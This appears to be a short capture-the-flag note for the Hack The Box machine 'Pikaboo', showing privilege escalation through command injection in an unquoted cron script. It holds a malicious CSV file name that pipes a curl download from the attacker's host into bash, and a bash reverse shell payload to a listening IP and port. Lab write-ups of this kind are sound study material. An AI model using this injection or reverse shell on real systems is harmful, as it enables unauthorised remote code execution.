# Command Injection

## csvupdate_cron

This cron has command injection 

```bash
/usr/local/bin/csvupdate $(basename $d) *csv
```

So creating a file with command injection in the name we can get RCE

```bash
┌──(root💀kali)-[~/HTB/Pikaboo/root/abilities]
└─# cat '| curl 10.10.15.18 | bash | 1.csv'       
id,identifier,generation_id,is_main_series
1,stench,3,1
```


## Bash Payload
```bash
┌──(root💀kali)-[~/HTB/Pikaboo/www]
└─# cat index.html                         
bash -i >& /dev/tcp/10.10.15.18/9002 0>&1
```



## FTP Upload File

![[Pasted image 20210718165037.png]]


## NC Listener

![[Pasted image 20210718165109.png]]